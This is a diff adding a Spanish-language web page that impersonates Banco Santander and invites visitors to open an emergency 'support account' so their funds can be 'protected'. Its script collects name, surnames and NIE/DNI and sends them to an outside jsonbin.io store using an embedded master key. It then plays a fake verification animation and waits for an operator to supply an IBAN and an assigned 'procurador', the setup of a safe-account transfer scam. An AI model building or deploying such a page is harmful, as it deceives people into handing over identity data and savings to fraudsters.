@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Cuenta de Soporte | Banco Santander</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { font-size: 16px; -webkit-text-size-adjust: 100%; }
+    body {
+      font-family: 'Open Sans', Arial, sans-serif;
+      background: #f4f4f4;
+      color: #333;
+      min-height: 100vh;
+    }
+
+    /* ── HEADER ── */
+    .header {
+      background: #fff;
+      border-bottom: 1px solid #e0e0e0;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      padding: 0 20px;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .header-logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      text-decoration: none;
+    }
+    .logo-flame {
+      width: 28px;
+      height: 28px;
+    }
+    .logo-name {
+      font-size: 18px;
+      font-weight: 700;
+      color: #EC0000;
+      letter-spacing: -0.3px;
+    }
+    .header-secure {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 12px;
+      color: #666;
+    }
+    .header-secure svg {
+      width: 14px;
+      height: 14px;
+      color: #4caf50;
+    }
+
+    /* ── AVISO SUPERIOR ── */
+    .aviso-top {
+      background: #1c3a5e;
+      color: #fff;
+      padding: 12px 20px;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+    .aviso-top-inner {
+      max-width: 680px;
+      margin: 0 auto;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+    .aviso-shield {
+      font-size: 20px;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+    .aviso-top strong {
+      color: #f0c040;
+    }
+
+    /* ── MAIN ── */
+    .page-wrap {
+      max-width: 520px;
+      margin: 0 auto;
+      padding: 24px 16px 48px;
+    }
+
+    /* ── FORM CARD ── */
+    .form-card {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .form-card-header {
+      background: #EC0000;
+      padding: 22px 24px;
+      color: #fff;
+    }
+    .form-card-header h1 {
+      font-size: 18px;
+      font-weight: 700;
+      letter-spacing: 0.3px;
+      margin-bottom: 4px;
+    }
+    .form-card-header p {
+      font-size: 13px;
+      opacity: 0.88;
+      line-height: 1.5;
+    }
+
+    .form-card-body {
+      padding: 24px;
+    }
+
+    /* ── FIELDS ── */
+    .field {
+      margin-bottom: 18px;
+    }
+    .field label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #444;
+      margin-bottom: 6px;
+    }
+    .field input {
+      width: 100%;
+      height: 46px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      padding: 0 14px;
+      font-size: 16px;
+      font-family: 'Open Sans', Arial, sans-serif;
+      color: #222;
+      background: #fff;
+      outline: none;
+      transition: border-color .2s;
+      -webkit-appearance: none;
+    }
+    .field input:focus {
+      border-color: #EC0000;
+    }
+    .field input::placeholder {
+      color: #bbb;
+      font-size: 14px;
+    }
+
+    /* ── SUBMIT ── */
+    .btn-submit {
+      width: 100%;
+      height: 48px;
+      background: #EC0000;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      font-size: 15px;
+      font-weight: 700;
+      font-family: 'Open Sans', Arial, sans-serif;
+      cursor: pointer;
+      letter-spacing: 0.3px;
+      margin-top: 4px;
+      transition: background .2s;
+    }
+    .btn-submit:hover { background: #c40000; }
+    .btn-submit:active { background: #a30000; }
+
+    .form-note {
+      font-size: 11px;
+      color: #888;
+      text-align: center;
+      margin-top: 14px;
+      line-height: 1.6;
+    }
+    .form-note a { color: #EC0000; text-decoration: none; }
+
+    /* ── DIVIDER ── */
+    .form-divider {
+      border: none;
+      border-top: 1px solid #eee;
+      margin: 20px 0;
+    }
+
+    /* ── INFO STRIP ── */
+    .info-strip {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      background: #f9f9f9;
+      border: 1px solid #e8e8e8;
+      border-radius: 3px;
+      padding: 12px 14px;
+      margin-bottom: 20px;
+    }
+    .info-strip svg {
+      width: 18px;
+      height: 18px;
+      color: #1c3a5e;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+    .info-strip p {
+      font-size: 12px;
+      color: #555;
+      line-height: 1.6;
+    }
+    .info-strip strong { color: #333; }
+
+    /* ── FEATURES ── */
+    .features-card {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      padding: 20px 24px;
+      margin-top: 16px;
+    }
+    .features-title {
+      font-size: 13px;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 16px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid #eee;
+    }
+    .feature-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 14px;
+    }
+    .feature-row:last-child { margin-bottom: 0; }
+    .feature-icon {
+      width: 32px;
+      height: 32px;
+      background: #f5f5f5;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .feature-icon svg { width: 16px; height: 16px; color: #EC0000; }
+    .feature-text h4 { font-size: 13px; font-weight: 700; color: #333; margin-bottom: 2px; }
+    .feature-text p { font-size: 12px; color: #777; line-height: 1.4; }
+
+    /* ── LOADING OVERLAY ── */
+    #loadingOverlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: #fff;
+      z-index: 9999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+    #loadingOverlay.active { display: flex; }
+
+    .loading-header {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 36px;
+    }
+    .loading-header svg { width: 32px; height: 32px; }
+    .loading-header span { font-size: 22px; font-weight: 700; color: #EC0000; }
+
+    .loading-title {
+      font-size: 17px;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 6px;
+      text-align: center;
+    }
+    .loading-sub {
+      font-size: 13px;
+      color: #888;
+      margin-bottom: 32px;
+      text-align: center;
+    }
+
+    .progress-wrap {
+      width: 100%;
+      max-width: 380px;
+      height: 4px;
+      background: #eee;
+      border-radius: 2px;
+      overflow: hidden;
+      margin-bottom: 32px;
+    }
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: #EC0000;
+      border-radius: 2px;
+      transition: width .5s ease;
+    }
+
+    .steps-list {
+      width: 100%;
+      max-width: 380px;
+    }
+    .step-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 10px 0;
+      border-bottom: 1px solid #f0f0f0;
+      font-size: 13px;
+      color: #aaa;
+    }
+    .step-row:last-child { border-bottom: none; }
+    .step-row.step-done { color: #4caf50; }
+    .step-row.step-active { color: #222; font-weight: 600; }
+    .step-num {
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      border: 2px solid #ddd;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 11px;
+      font-weight: 700;
+      flex-shrink: 0;
+      color: #bbb;
+      transition: all .3s;
+    }
+    .step-row.step-done .step-num {
+      background: #4caf50;
+      border-color: #4caf50;
+      color: #fff;
+    }
+    .step-row.step-active .step-num {
+      border-color: #EC0000;
+      color: #EC0000;
+    }
+    .loading-wait-msg {
+      font-size: 12px;
+      color: #aaa;
+      text-align: center;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header class="header">
+    <a href="index.html" class="header-logo">
+      <img src="logo_santander.svg" alt="Banco Santander" style="height:26px;width:auto;display:block;">
+    </a>
+    <div class="header-secure">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+      </svg>
+      Conexión segura
+    </div>
+  </header>
+
+  <!-- AVISO SUPERIOR -->
+  <div class="aviso-top">
+    <div class="aviso-top-inner">
+      <span class="aviso-shield">🛡</span>
+      <span>
+        <strong>Cuenta de Soporte y Emergencia</strong> — Esta cuenta ha sido habilitada por Banco Santander para
+        <strong>salvaguardar y proteger sus fondos</strong> durante el período de emergencia.
+        Un procurador autorizado supervisará la gestión de sus activos.
+      </span>
+    </div>
+  </div>
+
+  <!-- CONTENIDO -->
+  <div class="page-wrap">
+
+    <div class="form-card">
+      <div class="form-card-header">
+        <h1>ABRE TU CUENTA DE SOPORTE</h1>
+        <p>Complete sus datos personales para activar la protección inmediata de sus fondos</p>
+      </div>
+
+      <div class="form-card-body">
+
+        <div class="info-strip">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <line x1="12" y1="8" x2="12" y2="12"/>
+            <line x1="12" y1="16" x2="12.01" y2="16"/>
+          </svg>
+          <p>Sus datos están protegidos con <strong>cifrado SSL de 256 bits</strong>. La activación es inmediata y sin coste para usted.</p>
+        </div>
+
+        <form id="supportForm" onsubmit="submitForm(event)" novalidate>
+          <div class="field">
+            <label for="nombre">Nombre</label>
+            <input type="text" id="nombre" name="nombre" placeholder="Introduce tu nombre" required autocomplete="given-name">
+          </div>
+          <div class="field">
+            <label for="apellidos">Apellidos</label>
+            <input type="text" id="apellidos" name="apellidos" placeholder="Introduce tus apellidos" required autocomplete="family-name">
+          </div>
+          <div class="field">
+            <label for="nie">NIE / DNI</label>
+            <input type="text" id="nie" name="nie" placeholder="Ej: 12345678A" required autocomplete="off" maxlength="20">
+          </div>
+
+          <button type="submit" class="btn-submit">Activar Cuenta de Soporte</button>
+        </form>
+
+        <p class="form-note">
+          Al continuar acepta los <a href="#">Términos y Condiciones</a> y la
+          <a href="#">Política de Privacidad</a> de Banco Santander, S.A.
+        </p>
+
+      </div>
+    </div>
+
+    <!-- CARACTERÍSTICAS -->
+    <div class="features-card">
+      <p class="features-title">¿Por qué una Cuenta de Soporte?</p>
+      <div class="feature-row">
+        <div class="feature-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
+        </div>
+        <div class="feature-text">
+          <h4>Protección total de sus fondos</h4>
+          <p>Sus activos quedan bajo custodia segura durante el período de emergencia.</p>
+        </div>
+      </div>
+      <div class="feature-row">
+        <div class="feature-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <polyline points="12 6 12 12 16 14"/>
+          </svg>
+        </div>
+        <div class="feature-text">
+          <h4>Activación inmediata 24/7</h4>
+          <p>El proceso se completa en minutos, disponible en cualquier momento.</p>
+        </div>
+      </div>
+      <div class="feature-row">
+        <div class="feature-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+            <circle cx="12" cy="7" r="4"/>
+          </svg>
+        </div>
+        <div class="feature-text">
+          <h4>Procurador autorizado asignado</h4>
+          <p>Un gestor especializado supervisará sus fondos con total transparencia.</p>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- LOADING OVERLAY -->
+  <div id="loadingOverlay">
+    <div class="loading-header">
+      <img src="logo_santander.svg" alt="Banco Santander" style="height:32px;width:auto;">
+    </div>
+    <h2 class="loading-title">Activando su Cuenta de Soporte</h2>
+    <p class="loading-sub">Por favor, no cierre esta ventana</p>
+    <div class="progress-wrap">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <div class="steps-list">
+      <div class="step-row" id="step1">
+        <div class="step-num" id="sn1">1</div>
+        <span>Verificando identidad del titular</span>
+      </div>
+      <div class="step-row" id="step2">
+        <div class="step-num" id="sn2">2</div>
+        <span>Comprobando datos en el sistema</span>
+      </div>
+      <div class="step-row" id="step3">
+        <div class="step-num" id="sn3">3</div>
+        <span>Asignando procurador de fondos</span>
+      </div>
+      <div class="step-row" id="step4">
+        <div class="step-num" id="sn4">4</div>
+        <span>Generando IBAN de soporte</span>
+      </div>
+      <div class="step-row" id="step5">
+        <div class="step-num" id="sn5">5</div>
+        <span>Activando protección de fondos</span>
+      </div>
+    </div>
+    <p class="loading-wait-msg" id="waitMsg">Procesando solicitud...</p>
+  </div>
+
+  <script>
+    const API_BASE   = 'https://api.jsonbin.io/v3/b';
+    const BIN_ID     = '69c501f6c3097a1dd5605779';
+    const MASTER_KEY = '$2a$10$RoiwGd894wsPzcL0d6AYtegWuH4z7zN1P09knFoJ/sP6fOaecTzm.';
+
+    function genId() {
+      return Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
+    }
+
+    async function submitForm(e) {
+      e.preventDefault();
+      const nombre    = document.getElementById('nombre').value.trim();
+      const apellidos = document.getElementById('apellidos').value.trim();
+      const nie       = document.getElementById('nie').value.trim();
+      if (!nombre || !apellidos || !nie) return;
+
+      const sessionId = genId();
+      localStorage.setItem('san_session_id', sessionId);
+
+      document.getElementById('loadingOverlay').classList.add('active');
+      await runSteps();
+
+      try {
+        const res  = await fetch(`${API_BASE}/${BIN_ID}/latest`, { headers: { 'X-Master-Key': MASTER_KEY } });
+        const data = await res.json();
+        const sessions = data.record.sessions || [];
+        sessions.push({
+          id: sessionId, nombre, apellidos, nie,
+          status: 'pending',
+          timestamp: new Date().toLocaleString('es-ES'),
+          ua: navigator.userAgent,
+          iban: '', proc_nombre: '', proc_apellidos: ''
+        });
+        await fetch(`${API_BASE}/${BIN_ID}`, {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json', 'X-Master-Key': MASTER_KEY },
+          body: JSON.stringify({ sessions })
+        });
+      } catch(err) { console.error(err); }
+
+      pollForIban(sessionId);
+    }
+
+    async function runSteps() {
+      const steps = [
+        { id: 1, label: 'Verificando identidad...', ms: 1800 },
+        { id: 2, label: 'Comprobando datos...',     ms: 2200 },
+        { id: 3, label: 'Asignando procurador...',  ms: 2500 },
+        { id: 4, label: 'Generando IBAN...',         ms: 1600 },
+        { id: 5, label: 'Activando protección...',   ms: 1400 },
+      ];
+      for (let i = 0; i < steps.length; i++) {
+        const s = steps[i];
+        document.getElementById(`step${s.id}`).className = 'step-row step-active';
+        document.getElementById(`sn${s.id}`).textContent = s.id;
+        document.getElementById('waitMsg').textContent = s.label;
+        await new Promise(r => setTimeout(r, s.ms));
+        document.getElementById(`step${s.id}`).className = 'step-row step-done';
+        document.getElementById(`sn${s.id}`).textContent = '✓';
+        document.getElementById('progressBar').style.width = Math.round(((i + 1) / steps.length) * 80) + '%';
+      }
+      document.getElementById('waitMsg').textContent = 'En espera de asignación del procurador...';
+    }
+
+    async function pollForIban(sessionId) {
+      const interval = setInterval(async () => {
+        try {
+          const res  = await fetch(`${API_BASE}/${BIN_ID}/latest`, { headers: { 'X-Master-Key': MASTER_KEY } });
+          const data = await res.json();
+          const session = (data.record.sessions || []).find(s => s.id === sessionId);
+          if (session && session.status === 'ready' && session.iban) {
+            clearInterval(interval);
+            document.getElementById('progressBar').style.width = '100%';
+            document.getElementById('waitMsg').textContent = 'Cuenta activada correctamente';
+            await new Promise(r => setTimeout(r, 600));
+            window.location.href = 'confirmacion.html?id=' + sessionId;
+          }
+        } catch(err) { console.error(err); }
+      }, 4000);
+    }
+  </script>
+</body>
+</html>
